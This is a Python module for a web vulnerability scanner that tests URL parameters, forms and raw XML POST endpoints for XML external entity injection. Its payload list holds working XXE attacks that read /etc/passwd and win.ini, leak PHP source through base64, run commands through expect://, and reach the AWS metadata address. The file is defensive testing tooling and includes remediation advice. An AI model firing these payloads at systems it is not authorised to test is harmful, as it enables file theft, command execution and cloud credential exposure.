"""XML External Entity (XXE) Injection Scanner - OWASP A05:2021."""
import re
from urllib.parse import urlparse
from core.base_scanner import BaseScanner
from core.logger import vuln, debug, info

# URL/content-type patterns that suggest an endpoint actually processes XML
XML_ENDPOINT_RE = re.compile(
    r"xml|soap|wsdl|api|upload|import|parse|feed|rss|atom|service|ws",
    re.IGNORECASE,
)

# XXE payloads: (payload_template, description, detection_regex)
XXE_PAYLOADS = [
    # Classic Linux file read
    (
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>',
        "Classic file read /etc/passwd",
        r"root:.*:0:0:|daemon:|nobody:"
    ),
    # Windows file read
    (
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///C:/windows/win.ini">]><root>&xxe;</root>',
        "Classic file read win.ini",
        r"\[fonts\]|for 16-bit"
    ),
    # /etc/hosts
    (
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/hosts">]><root>&xxe;</root>',
        "File read /etc/hosts",
        r"127\.0\.0\.1|localhost"
    ),
    # PHP filter
    (
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php">]><root>&xxe;</root>',
        "PHP filter base64 encode",
        r"[A-Za-z0-9+/]{40,}={0,2}"
    ),
    # Expect (RCE via XXE if PHP expect enabled)
    (
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "expect://id">]><root>&xxe;</root>',
        "PHP expect RCE",
        r"uid=\d+|www-data|root"
    ),
    # Blind SSRF via XXE (external DTD)
    (
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]><root>&xxe;</root>',
        "Blind SSRF - AWS metadata",
        r"ami-id|instance-id|local-ipv4|placement"
    ),
    # Parameter entity
    (
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "file:///etc/passwd"> %xxe;]><root></root>',
        "Parameter entity",
        r"root:.*:0:0:"
    ),
    # DTD via CDATA (bypass content filters)
    (
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/issue">]><root>&xxe;</root>',
        "File read /etc/issue",
        r"Ubuntu|Debian|CentOS|Linux|Welcome"
    ),
    # Billion laughs (DoS detection only - we just look for error, don't actually send)
    # Skipping - DoS payload
    # XInclude attack
    (
        '<root xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></root>',
        "XInclude attack",
        r"root:.*:0:0:"
    ),
]

# Common XML content types to try injecting into
XML_CONTENT_TYPES = [
    "application/xml",
    "text/xml",
    "application/soap+xml",
    "application/xhtml+xml",
]

ERROR_SIGNS = re.compile(
    r"xml.*error|parse.*error|entity|dtd|external.*entity|"
    r"xml.*exception|sax.*exception|xerces|expat",
    re.IGNORECASE
)

DETECT_RE = re.compile(
    r"root:.*:0:0:|daemon:|nobody:|127\.0\.0\.1|localhost|"
    r"\[fonts\]|for 16-bit|ami-id|instance-id|"
    r"Ubuntu|Debian|CentOS|uid=\d+",
    re.IGNORECASE
)


class XXEScanner(BaseScanner):
    MODULE_NAME = "xxe"
    OWASP_CATEGORY = "A05:2021 - Security Misconfiguration"

    def _looks_like_xml_endpoint(self, url: str) -> bool:
        """Return True only for URLs that plausibly accept XML bodies."""
        parsed = urlparse(url)
        target = parsed.path + ("?" + parsed.query if parsed.query else "")
        return bool(XML_ENDPOINT_RE.search(target))

    def scan(self, urls: list) -> list:
        findings = []
        tested = set()

        for url in urls:
            # Test URL params that might carry XML
            params = self.get_url_params(url)
            for param in params:
                key = f"url_param:{url}:{param}"
                if key in tested:
                    continue
                tested.add(key)
                findings.extend(self._test_url_param(url, param))

            # Test forms - inject XXE into text inputs
            forms = self.get_forms(url)
            for form in forms:
                key = f"form:{form['url']}"
                if key in tested:
                    continue
                tested.add(key)
                findings.extend(self._test_form(form))

            # Raw XML POST - ONLY for endpoints that look like they consume XML.
            # Firing this at every crawled HTML page caused the scanner to hang.
            if self._looks_like_xml_endpoint(url):
                key = f"xml_post:{url}"
                if key not in tested:
                    tested.add(key)
                    debug(f"  XXE xml_post probe: {url}")
                    findings.extend(self._test_xml_post(url))

        return findings

    def _test_url_param(self, url: str, param: str) -> list:
        findings = []
        for payload, desc, sig in XXE_PAYLOADS:
            injected = self.inject_param(url, param, payload)
            resp = self.session.get(injected)
            if not resp:
                continue
            matched = self._detect(resp.text, sig)
            if matched:
                f = self.make_finding(
                    url=url, param=param, payload=payload[:150],
                    evidence=matched[:300],
                    severity="CRITICAL",
                    description=f"XXE Injection ({desc}): XML external entity processed. File content leaked.",
                    remediation=(
                        "Disable external entity processing in your XML parser. "
                        "Use a safe XML parsing library. Validate and sanitize all XML input. "
                        "Implement XML schema validation."
                    ),
                )
                vuln(f"  [VULN] XXE @ {url} | param={param} | {desc}")
                findings.append(f)
                break
        return findings

    def _test_form(self, form: dict) -> list:
        findings = []
        for field in form["inputs"]:
            for payload, desc, sig in XXE_PAYLOADS[:6]:
                results = self.test_form(form, payload, field_override=field)
                for fname, resp in results:
                    if not resp:
                        continue
                    matched = self._detect(resp.text, sig)
                    if matched:
                        f = self.make_finding(
                            url=form["url"], param=field, payload=payload[:150],
                            evidence=matched[:300],
                            severity="CRITICAL",
                            description=f"XXE Injection via form field ({desc}).",
                            remediation="Disable external entity processing. Validate XML input server-side.",
                        )
                        vuln(f"  [VULN] XXE (form) @ {form['url']} | field={field}")
                        findings.append(f)
                        break
        return findings

    def _test_xml_post(self, url: str) -> list:
        """POST raw XML payloads directly to the endpoint.
        Only called for URLs that _looks_like_xml_endpoint() approved.
        Stops at the first content-type that gets a non-404 response, so we
        don't hammer every content-type × payload combination needlessly.
        """
        findings = []

        # Passive probe first with a single malformed XML body - if the server
        # returns 404/405 for all XML content-types we skip active payloads entirely.
        accepting_ct = None
        for content_type in XML_CONTENT_TYPES:
            try:
                probe = self.session.request(
                    "POST", url,
                    data=b"<probe/>",
                    headers={"Content-Type": content_type},
                )
                if probe and probe.status_code not in (404, 405, 501):
                    accepting_ct = content_type
                    # Check for XML error disclosure on this probe response
                    if ERROR_SIGNS.search(probe.text):
                        m = ERROR_SIGNS.search(probe.text)
                        start = max(0, m.start() - 30)
                        findings.append(self.make_finding(
                            url=url, param=f"body[{content_type}]",
                            payload="<probe/> (malformed XML)",
                            evidence=probe.text[start:start + 200].strip(),
                            severity="LOW",
                            description=(
                                "XML parser error exposed in response. "
                                "Endpoint may be vulnerable to XXE injection."
                            ),
                            remediation="Handle XML parsing errors gracefully without exposing parser details.",
                            vulnerable=False,
                        ))
                    break  # Found an accepting content-type, no need to try more
            except Exception as e:
                debug(f"XXE probe error @ {url}: {e}")

        if not accepting_ct:
            debug(f"  XXE: no XML-accepting content-type found @ {url}, skipping payloads")
            return findings

        # Active payloads - only against the one content-type that worked
        for payload, desc, sig in XXE_PAYLOADS[:6]:
            try:
                resp = self.session.request(
                    "POST", url,
                    data=payload.encode("utf-8"),
                    headers={"Content-Type": accepting_ct},
                )
                if not resp:
                    continue
                matched = self._detect(resp.text, sig)
                if matched:
                    findings.append(self.make_finding(
                        url=url, param=f"body[{accepting_ct}]",
                        payload=payload[:150],
                        evidence=matched[:300],
                        severity="CRITICAL",
                        description=(
                            f"XXE Injection via raw XML POST ({desc}). "
                            f"Content-Type: {accepting_ct}"
                        ),
                        remediation=(
                            "Disable external entity processing. "
                            "Reject unexpected content types. "
                            "Use allowlist-based XML parsing."
                        ),
                    ))
                    vuln(f"  [VULN] XXE (raw POST) @ {url} | ct={accepting_ct}")
                    return findings  # One confirmed hit per URL is enough
            except Exception as e:
                debug(f"XXE POST error @ {url}: {e}")

        return findings

    def _detect(self, text: str, sig: str) -> str:
        """Return evidence string if signature matches, else empty string."""
        if sig:
            m = re.search(sig, text, re.IGNORECASE)
            if m:
                start = max(0, m.start() - 40)
                return text[start:start + 300].strip()
        if DETECT_RE.search(text):
            m = DETECT_RE.search(text)
            start = max(0, m.start() - 40)
            return text[start:start + 300].strip()
        return ""
